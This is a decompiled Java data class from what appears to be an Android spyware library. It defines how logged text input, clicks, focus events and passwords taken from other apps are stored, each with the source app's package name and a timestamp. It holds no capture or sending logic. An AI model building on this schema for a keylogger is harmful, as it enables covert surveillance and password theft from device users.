package com.hawkshaw.library.datalayer.room.keylogger;

import Y1.K;
import d3.C0393a;
import j3.f;

public final class KeyLogEntity {
    private int id;
    private final String message;
    private final String packageName;
    private final long timestamp;
    private final Type type;

    public enum Type {
        Unknown,
        TextChanged,
        ViewClicked,
        ViewFocused,
        Password;

        static {
            Type[] $values;
            $ENTRIES = K.J($values);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }
    }

    /* JADX INFO: this call moved to the top of the method (can break code semantics) */
    public /* synthetic */ KeyLogEntity(Type type2, String str, String str2, long j5, int i5, f fVar) {
        this(type2, str, str2, (i5 & 8) != 0 ? System.currentTimeMillis() : j5);
    }

    public static /* synthetic */ KeyLogEntity copy$default(KeyLogEntity keyLogEntity, Type type2, String str, String str2, long j5, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            type2 = keyLogEntity.type;
        }
        if ((i5 & 2) != 0) {
            str = keyLogEntity.message;
        }
        String str3 = str;
        if ((i5 & 4) != 0) {
            str2 = keyLogEntity.packageName;
        }
        String str4 = str2;
        if ((i5 & 8) != 0) {
            j5 = keyLogEntity.timestamp;
        }
        return keyLogEntity.copy(type2, str3, str4, j5);
    }

    public final Type component1() {
        return this.type;
    }

    public final String component2() {
        return this.message;
    }

    public final String component3() {
        return this.packageName;
    }

    public final long component4() {
        return this.timestamp;
    }

    public final KeyLogEntity copy(Type type2, String str, String str2, long j5) {
        K.n(type2, "type");
        K.n(str, "message");
        K.n(str2, "packageName");
        return new KeyLogEntity(type2, str, str2, j5);
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (!(obj instanceof KeyLogEntity)) {
            return false;
        }
        KeyLogEntity keyLogEntity = (KeyLogEntity) obj;
        return this.type == keyLogEntity.type && K.f(this.message, keyLogEntity.message) && K.f(this.packageName, keyLogEntity.packageName) && this.timestamp == keyLogEntity.timestamp;
    }

    public final int getId() {
        return this.id;
    }

    public final String getMessage() {
        return this.message;
    }

    public final String getPackageName() {
        return this.packageName;
    }

    public final long getTimestamp() {
        return this.timestamp;
    }

    public final Type getType() {
        return this.type;
    }

    public int hashCode() {
        int hashCode = this.message.hashCode();
        int hashCode2 = this.packageName.hashCode();
        return Long.hashCode(this.timestamp) + ((hashCode2 + ((hashCode + (this.type.hashCode() * 31)) * 31)) * 31);
    }

    public final void setId(int i5) {
        this.id = i5;
    }

    public String toString() {
        Type type2 = this.type;
        String str = this.message;
        String str2 = this.packageName;
        long j5 = this.timestamp;
        return "KeyLogEntity(type=" + type2 + ", message=" + str + ", packageName=" + str2 + ", timestamp=" + j5 + ")";
    }

    public KeyLogEntity(Type type2, String str, String str2, long j5) {
        K.n(type2, "type");
        K.n(str, "message");
        K.n(str2, "packageName");
        this.type = type2;
        this.message = str;
        this.packageName = str2;
        this.timestamp = j5;
    }
}
